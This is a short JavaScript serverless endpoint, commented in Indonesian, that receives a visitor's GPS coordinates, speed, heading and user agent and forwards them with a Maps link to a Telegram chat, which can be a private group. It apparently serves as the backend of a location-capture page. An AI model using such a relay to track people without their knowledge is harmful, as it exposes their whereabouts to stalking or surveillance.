// api/report.js
export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ ok: false, error: 'Method not allowed' });
  try {
    const { latitude, longitude, accuracy, altitude, heading, speed, timestamp, userAgent } = req.body || {};

    // Validasi sederhana
    if (typeof latitude !== 'number' || typeof longitude !== 'number') {
      return res.status(400).json({ ok: false, error: 'Invalid coordinates' });
    }

    // Kirim ke Telegram
    const token = process.env.TELEGRAM_TOKEN;
    const chatId = process.env.CHAT_ID; // bisa grup privat
    const maps = `https://maps.google.com/?q=${latitude},${longitude}`;
    const msg =
`📍 Lokasi diterima
Lat: ${latitude}
Lng: ${longitude}
Akurasi: ${accuracy ?? '-'} m
Altitude: ${altitude ?? '-'}
Arah: ${heading ?? '-'}
Kecepatan: ${speed ?? '-'}
Waktu: ${timestamp}
UA: ${userAgent}
Maps: ${maps}`;

    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const tgRes = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: msg }),
    });

    if (!tgRes.ok) {
      const t = await tgRes.text();
      return res.status(500).json({ ok: false, error: 'Telegram error: ' + t });
    }

    return res.status(200).json({ ok: true });
  } catch (e) {
    return res.status(500).json({ ok: false, error: e.message });
  }
}
